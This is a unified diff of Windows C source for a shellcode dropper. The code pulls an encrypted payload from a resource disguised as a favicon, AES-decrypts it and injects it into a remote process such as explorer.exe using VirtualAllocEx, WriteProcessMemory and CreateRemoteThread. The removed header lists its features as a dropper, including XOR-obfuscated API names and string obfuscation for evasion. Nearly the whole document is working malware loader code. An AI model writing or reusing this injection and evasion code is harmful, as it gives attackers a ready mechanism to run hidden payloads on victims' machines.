@@ -1,26 +1,19 @@
-// Dropper:
-// X shellcode == MessageBox
-// X extract shellcode from .rsrc
-// X decrypt shellcode (XOR)
-// X inject shellcode into explorer.exe
-// X hide console
-// X obfuscate functions
-// X obfuscate strings (XOR)
-// - obfuscate all function calls
-// - change XOR to AES
-
 #include <windows.h>
 #include <tlhelp32.h>
 #pragma comment (lib, "advapi32")
 #include "resources.h"
+#include "helpers.h"
+
+typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
 
 char key[] = "mysecretkeee";
 
 // Inject
-LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-BOOL (WINAPI *pWriteProcessMemory)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
-HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-BOOL (WINAPI *pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+// LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+// BOOL (WINAPI *pWriteProcessMemory)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+// HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+// BOOL (WINAPI *pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
 
 void XOR(char *data, size_t data_len, char *key, size_t key_len) {
 	int j;
@@ -97,35 +90,35 @@ int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
     HANDLE hThread = NULL;
     DWORD oldProtect = 0;
 
-	unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
-	unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
-	unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
-	unsigned char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x2, 0xb, 0x2, 0x9, 0x8, 0x36, 0x11, 0xf, 0x6, 0x11, 0x11 };
+	// unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
+	// unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
+	// unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
+	// unsigned char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x2, 0xb, 0x2, 0x9, 0x8, 0x36, 0x11, 0xf, 0x6, 0x11, 0x11 };
 
-	XOR(sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
-	XOR(sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
-	XOR(sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
-	XOR(sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
+	// XOR(sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
+	// XOR(sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
+	// XOR(sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
+	// XOR(sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
 
-    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
-    pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
-    pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
-    pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), sWaitForSingleObject);
+ //    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
+ //    pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
+ //    pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
+ //    pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), sWaitForSingleObject);
 
-    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
+    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
     
-    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
+    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
 
     if (hThread != NULL) {
-            pWaitForSingleObject(hThread, -1);
+            WaitForSingleObject(hThread, -1);
             CloseHandle(hThread);
             return 0;
     }
     return -1;
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
 	void * exec_mem;
 	HGLOBAL resHandle = NULL;
@@ -139,14 +132,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine,
 	// Extract payload from resources section
 	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
 	resHandle = LoadResource(NULL, res);
-	payload = (char *) LockResource(resHandle);
+	payload = (unsigned char *) LockResource(resHandle);
 	payload_len = SizeofResource(NULL, res);
 
 	// Allocate some memory buffer for payload
 	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // Decrypt payload
-    AESDecrypt((char *)payload, payload_len, AESkey, sizeof(AESkey));
+    AESDecrypt((char *)payload, payload_len, (char *)AESkey, sizeof(AESkey));
 
 	// Copy payload to new memory buffer
 	RtlMoveMemory(exec_mem, payload, payload_len);
@@ -164,7 +157,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine,
 						FALSE, (DWORD) pid);
 
 		if (hProc != NULL) {
-			Inject(hProc, exec_mem, payload_len);
+			Inject(hProc, (unsigned char *)exec_mem, payload_len);
 			CloseHandle(hProc);
 		}
 	}
